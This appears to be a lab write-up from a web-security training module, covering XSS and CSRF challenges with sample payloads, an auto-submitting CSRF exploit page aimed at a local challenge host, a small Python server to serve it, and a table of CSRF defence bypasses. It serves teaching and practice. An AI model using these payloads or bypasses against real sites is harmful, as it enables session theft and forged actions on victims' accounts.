## Overview

This module walks through the fundamentals of client-side web vulnerabilities:

| Topic                                 | What it tests                                                                 |
| ------------------------------------- | ----------------------------------------------------------------------------- |
| **Content Injection**                 | Injecting unsanitised user input into HTML responses                          |
| **Path Traversal**                    | Accessing files outside applications outside of application's intended folder |
| **Command Injection**                 | Injecting commands into the shell via web inputs                              |
| **Authentication Bypass**             | Bypassing authentication logic of an application                              |
| **SQL Injection**                     | Exploiting unsanitised SQL queries                                            |
| **Cross-Site Scripting (XSS)**        | Executing attacker-controlled JavaScript in a victim's browser                |
| **Cross-Site Request Forgery (CSRF)** | Forging authenticated requests from a victim's session                        |

## Cross-Site Scripting (XSS)

XSS allows an attacker to inject and execute JavaScript in the context of a target website inside another user's browser.

## Stored XSS

The payload is persisted server-side (DB, log, comment field) and served to every subsequent visitor.

### XSS 1

Injecting an `<input>` textbox

```html
<input>pwned</input>
```

### XSS 2

Triggering an alert saying PWNED

```html
</textarea><script>alert("PWNED")</script>
```

## Reflected XSS

The payload travels in the request (URL param, form field) and is immediately echoed back in the response.

**Challenge approach:**

1. Find a parameter reflected in the page source.
2. Determine the injection context (HTML body / attribute / script block).
3. Craft a payload that breaks out of the current context.
4. Escalate — exfiltrate cookies with `document.cookie` or probe session tokens.

### DOM XSS

The vulnerability lives entirely in client-side JavaScript; the server never sees the payload.

```javascript
// Vulnerable sink example
document.getElementById('output').innerHTML = location.hash.slice(1);

// Payload in the URL fragment — never sent to server
https://victim.com/page#<img src=x onerror=alert(1)>
```

## Cross-Site Request Forgery (CSRF)

CSRF abuses the fact that browsers automatically attach cookies to any request matching the cookie's domain/path, regardless of _which_ site initiated the request.

### CSRF 1 - Publish Flag Post of Admin with CSRF

This dojo is blog where users can write posts to publish (`/publish`) or save to drafts (`/draft`). The challenge wants us to publish the flag which is in the admin's draft.
We would do this by setting up a python server on our machine to host our payload in a .html file and the victim (admin) visits our URL which executes `/publish` to publish the victims drafts, thereby revealing the post containing the flag on the general blog.

#### Exploit Skeleton

`index.html` - hosted on our server `http://hacker.localhost:1337/`

```html
<html>
  <body>
    <form action="http://challenge.localhost/publish" method="get">
      Post:<textarea name="content">Tis I admin</textarea>
      <input type="checkbox" name="publish" value="on" checked />Publish
      <input type="submit" value="Save" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

I had Deepseek build me a listener

`server.py`

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ("/", "/index.html"):
            with open("index.html", "rb") as f:
                body = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        print("=== POST BODY ===")
        print(body.decode("utf-8", "replace"))
        self.send_response(200)
        self.end_headers()

HTTPServer(("0.0.0.0", 1337), Handler).serve_forever()
```

### CSRF Defences (and bypasses tested in the module)

| Defence                                             | Bypass                                                          |
| --------------------------------------------------- | --------------------------------------------------------------- |
| **CSRF token** (correctly implemented)              | No bypass — must leak the token first (via XSS, CORS, referrer) |
| **SameSite=Lax** cookie                             | Still vulnerable to top-level navigation (`GET`) requests       |
| **Origin / Referer check**                          | Spoof with null origin, or chain via open redirect              |
| **Custom request header** (e.g. `X-Requested-With`) | Only effective if CORS blocks the preflight                     |

## Lessons Learned

- **Always check the injection context first.** The shape of a working payload is entirely determined by where the data lands in the DOM — rushing to `<script>alert(1)` without reading the source wastes time.
- **XSS is the master key for CSRF.** A stored or reflected XSS that reaches an admin unlocks CSRF token exfiltration, making otherwise CSRF-protected endpoints exploitable.
- **SameSite cookies are not a complete CSRF defence.** Lax mode still permits top-level GET navigations; only `Strict` or a proper CSRF token scheme closes the gap for sensitive state-changing operations.
- **Content injection without script execution still has impact.** Defaced pages, injected phishing forms, and exfil via `<img src>` are all achievable with pure HTML injection when `<script>` is blocked.
